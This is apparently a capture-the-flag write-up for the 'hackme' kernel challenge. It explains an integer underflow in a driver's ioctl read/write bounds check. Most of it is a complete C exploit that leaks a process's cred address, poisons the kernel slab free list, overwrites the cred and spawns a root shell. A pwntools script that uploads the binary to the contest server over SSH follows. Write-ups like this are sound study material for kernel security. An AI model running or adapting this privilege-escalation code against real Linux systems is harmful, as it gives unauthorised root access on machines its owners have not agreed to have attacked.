## hackme

This is a kernel exploitation challenge that requires us to get root to read the flag, and I failed to solve it in contest, but let's see.

An `ioctl` is implemented in `hackme.ko`. There are 4 commands: to create memory chunk using `kmalloc`, to delete memory chunk using `kfree`, to read memory chunk using `copy_to_user` and to write the memory chunk using `copy_from_user`. When reading and writing the memory chunks, `offset` and `size` can be specified to only read or write part of the memory chunk. Here is where the vulnerability comes from: there is an integer overflow.

```c
v9 = v19.idx;
v10 = pool[v9].buf;
v11 = &pool[v9];
if ( v10 && v19.off + v19.size <= v11->max_size )
{
  //when v19.off == -0x200L and v19.size == 0x200L
  //we can have a underflow
  //also works for read operation
  copy_from_user(&v10[v19.off], v19.usrbuf, v19.size);
  return 0LL;
}
```

### First Attempt

I initially tried to use [this method](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/). In one word, `kfree` a chunk with same size as `struct cred`, and then `fork`, so that the `struct cred` of new process will be the same one as the chunk just being `kfree`ed. Then rewrite this `struct cred` by underflow. However, this does not seem work. Since the `struct cred` of new process is not the same one as the one just being `kfree`ed. I don't know the reason. Maybe it is because the kernel version since that one is `4.4.72` and this one is `4.20.13`, or it is because the `flag` argument of `kmalloc` is different.

### Second Attempt

Then I tried to leak the `cred` first, using `prctl(PR_SET_NAME, comm)`. The detail is [here](https://poppopret.org/2015/11/16/csaw-ctf-2015-kernel-exploitation-challenge/). This works if I read `0x100000L` bytes. Also, we can also leak the address of our memory chunks by reading `next` pointer of freed chunk. After leaking addresses, I found `cred` is very far from the memory chunks, so we cannot rewrite it directly because that will cause kernel panic. 

The correct approach is to rewrite `next` pointer of the free list, a bit similar to `tcache poisoning` in `ptmalloc` exploitation. We can let `kmalloc` return an address near the `cred`, so we can rewrite `cred`. However, we don't want the free list to be corrupted since that will cause kernel panic, so we need to find a memory region whose first 8 bytes are all 0, fortunately `QWORD PTR [address of cred - 0x10] == NULL`.

Final exploit

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <memory.h>
#include <string.h>
#include <assert.h>

char tab[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
'w', 'x', 'y', 'z', '0', '1', '2', '3',
'4', '5', '6', '7', '8', '9', '+', '/'};


struct data
{
	unsigned int idx;
	char *usrbuf;
	size_t size;
	size_t off;
};
#define BUF_SIZE 0x100000L
struct data param = {0};
char buffer[BUF_SIZE] = {0};
int fd;

void init()
{
	fd = open("/dev/hackme",0);
	if (fd < 0)
		exit(-1);
	param.usrbuf = buffer;
}

void error_exit(char* msg)
{
	puts(msg);
	exit(-1);
}

void kmalloc(unsigned int idx, size_t size, char sig)
{
	memset(buffer, sig, sizeof(buffer));
	param.size = size;
	param.idx = idx;
	int ret = ioctl(fd, 0x30000, &param);
	if (ret < 0) error_exit("Error: kmalloc");
}

void write_memory(unsigned int idx, size_t size, size_t off)
{
	param.size = size;
	param.idx = idx;
	param.off = off;
	int ret = ioctl(fd, 0x30002, &param);
	if (ret < 0) error_exit("Error: write_memory");
}

void read_memory(unsigned int idx, size_t size, size_t off)
{
	param.size = size;
	param.idx = idx;
	param.off = off;
	int ret = ioctl(fd, 0x30003, &param);
	if (ret < 0) error_exit("Error: read_memory");
}

void kfree(unsigned int idx)
{
	param.idx = idx;
	int ret = ioctl(fd, 0x30001, &param);
	if (ret < 0) error_exit("Error: read_memory");
}

void printhex(char* pbuf, size_t size)
{
	unsigned char* buf = (unsigned char*)pbuf;
	for (size_t i = 0; i < size; ++i)
	{
		printf("%.2x", buf[i]);
	}
	printf("\n");
}

char comm[] = "201920192019";
#define CHUNK_SIZE 0x40L
int main(int argc, char const *argv[])
{
	uintptr_t cred;
	//if (argc == 1) exit(-1);
	prctl(PR_SET_NAME, comm);
	//size_t credsize = strtoul(argv[1], 0, 16);
	init();

	for (int i = 0; i < 64; ++i)
	{
		kmalloc(i, CHUNK_SIZE, tab[i]);
	}
	read_memory(63, BUF_SIZE, -BUF_SIZE);
	char* ret = (char*)memmem(buffer, sizeof(buffer), comm, sizeof(comm) - 1);
	if (ret)
	{
		cred = *(uintptr_t*)(ret - 8);
		assert(*(uintptr_t*)(ret - 0x10) == cred);

		//write(1, buffer, BUF_SIZE);
		printf("%p %p\n", (void*)(ret - buffer), (void*)cred);
		puts(ret);
	}

	const size_t LEAK_SIZE = 0x400L;

	puts("Before: ");
	kfree(62);

	kfree(61);
	read_memory(63, LEAK_SIZE, -LEAK_SIZE);
	//printhex(buffer, LEAK_SIZE);

	uintptr_t addr_62 = *(uintptr_t*)(buffer + LEAK_SIZE - CHUNK_SIZE*2);
	printf("%p\n", (void*)addr_62);

	*(uintptr_t*)buffer = cred - 0x10;
	write_memory(63, CHUNK_SIZE*2, -CHUNK_SIZE*2);


	memset(buffer, 0, CHUNK_SIZE);
	kmalloc(61, CHUNK_SIZE, '\x00'); //consume a chunk
	kmalloc(62, CHUNK_SIZE, '\x00'); //rewrite cred here

	system("/bin/sh");
    // execve will cause kernel panic, no idea why
    // and the exploit works for 80% probability

	return 0;
}
```

upload.py
```python
#musl-gcc -static exp.c -o ./fs/home/pwn/exp
from pwn import *
import base64
context(log_level='debug', arch='amd64')

HOST = "35.221.78.115"
PORT =  10022
USER = "pwn"
PW = "pwn"
BIN = "./fs/home/pwn/exp"

def exec_cmd(sh, cmd):
	sh.sendline(cmd)
	sh.recvuntil("$ ")

if __name__ == "__main__":
	sh = ssh(USER, HOST, PORT, PW).run("/bin/sh")
	with open(BIN, "rb") as f:
		data = f.read()
	encoded = base64.b64encode(data)
	sh.recvuntil("$ ")

	once_size = 0x200
	for i in range(0, len(encoded), once_size):
		exec_cmd(sh, "echo -n \"%s\" >> benc" % (encoded[i:i+once_size]))
		print float(i)/len(encoded)

	exec_cmd(sh, "cat benc | base64 -d > exp")
	exec_cmd(sh, "chmod +x exp")
	sh.interactive()
```


`*CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}`
